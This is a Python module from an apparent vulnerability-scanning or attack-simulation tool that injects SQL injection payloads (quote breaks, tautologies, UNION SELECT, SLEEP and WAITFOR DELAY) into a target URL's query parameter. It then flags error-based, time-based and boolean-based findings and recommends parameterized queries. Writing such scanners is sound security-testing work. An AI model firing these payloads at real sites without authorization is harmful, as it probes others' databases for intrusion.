import requests
from .base import AttackModule
import urllib3
import time
import json

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class SQLInjectionModule(AttackModule):
    name = "SQL Injection"
    description = "Detecta vulnerabilidades SQL Injection (Error-based, Time-based, Boolean-based)"
    severity = "high"
    
    def run(self, target: str) -> dict:
        session = requests.Session()
        session.verify = False
        headers = {'User-Agent': 'AttackSim/1.0'}
        
        results = []
        
        # Payloads específicos para cada tipo
        error_payloads = [
            ("'", "unclosed quotation"),
            ("\"", "unclosed quotation"),
            ("1'", "mysql error"),
            ("1 AND 1=1", "boolean"),
            ("1 AND 1=2", "boolean false"),
            ("' OR '1'='1", "tautology"),
            ("' UNION SELECT NULL--", "union"),
        ]
        
        time_payloads = [
            ("' OR SLEEP(2)--", 2),
            ("'; WAITFOR DELAY '0:0:2'--", 2),
            ("' AND SLEEP(2) AND '1'='1", 2),
        ]
        
        # Obter baseline
        try:
            normal = session.get(target, headers=headers, timeout=10)
            normal_len = len(normal.text)
            normal_time = 0
            start = time.time()
            session.get(target, headers=headers, timeout=10)
            normal_time = time.time() - start
        except:
            return {"success": False, "severity": "warning", "details": "Target unreachable"}
        
        # 1. Error-based detection
        for payload, technique in error_payloads:
            try:
                test_url = self._inject_payload(target, payload)
                response = session.get(test_url, headers=headers, timeout=10)
                content = response.text
                content_lower = content.lower()
                
                # Indicadores REAIS de SQL error (em texto)
                sql_errors = [
                    "you have an error in your sql syntax",
                    "mysql_fetch_array()",
                    "mysql_num_rows()",
                    "supplied argument is not a valid mysql",
                    "unclosed quotation mark after the character string",
                    "microsoft ole db provider for odbc drivers",
                    "warning: mysql",
                    "near \"",
                ]
                
                found = False
                for error in sql_errors:
                    if error in content_lower:
                        results.append({
                            "type": "Error-based",
                            "payload": payload,
                            "technique": technique,
                            "evidence": f"SQL error: {error[:50]}...",
                            "confidence": "high"
                        })
                        found = True
                        break
                
                # Detecção adicional para endpoints que retornam JSON com "vulnerable": true
                if not found:
                    try:
                        data = json.loads(content)
                        if data.get("vulnerable") or "SQL Injection" in data.get("message", ""):
                            results.append({
                                "type": "Error-based (JSON)",
                                "payload": payload,
                                "evidence": f"JSON indicates vulnerability: {data.get('error', data.get('message', ''))[:60]}",
                                "confidence": "high"
                            })
                            found = True
                    except:
                        pass
                        
            except:
                continue
        
        # 2. Time-based detection
        for payload, delay in time_payloads:
            try:
                test_url = self._inject_payload(target, payload)
                start = time.time()
                session.get(test_url, headers=headers, timeout=delay+5)
                elapsed = time.time() - start
                
                if elapsed > normal_time + delay * 0.7:
                    results.append({
                        "type": "Time-based Blind",
                        "payload": payload,
                        "evidence": f"Response delayed by {elapsed:.2f}s (normal: {normal_time:.2f}s)",
                        "confidence": "medium"
                    })
            except:
                continue
        
        # 3. Boolean-based detection
        true_payloads = ["' AND '1'='1", "1 AND 1=1"]
        false_payloads = ["' AND '1'='2", "1 AND 1=2"]
        
        for true_p, false_p in zip(true_payloads, false_payloads):
            try:
                url_true = self._inject_payload(target, true_p)
                url_false = self._inject_payload(target, false_p)
                
                resp_true = session.get(url_true, headers=headers, timeout=10)
                resp_false = session.get(url_false, headers=headers, timeout=10)
                
                diff = abs(len(resp_true.text) - len(resp_false.text))
                
                if diff > 100:
                    results.append({
                        "type": "Boolean-based Blind",
                        "payload": true_p,
                        "evidence": f"Response length differs by {diff} bytes",
                        "confidence": "medium"
                    })
            except:
                continue
        
        if results:
            has_error = any(r['type'] in ['Error-based', 'Error-based (JSON)'] for r in results)
            severity = "critical" if has_error else "high"
            
            return {
                "success": True,
                "severity": severity,
                "details": f"🎯 Found {len(results)} SQL injection vulnerabilities!",
                "findings": results[:5],
                "remediation": "Use parameterized queries / prepared statements"
            }
        
        return {
            "success": False,
            "severity": "info",
            "details": "No SQL injection vulnerabilities detected",
            "remediation": "Site appears secure against basic SQLi tests"
        }
    
    def _inject_payload(self, target: str, payload: str) -> str:
        """Injeta payload na URL."""
        if '?' in target and '=' in target:
            base, param = target.split('?', 1)
            param_name, value = param.split('=', 1)
            return f"{base}?{param_name}={payload}"
        else:
            return f"{target}?id={payload}"
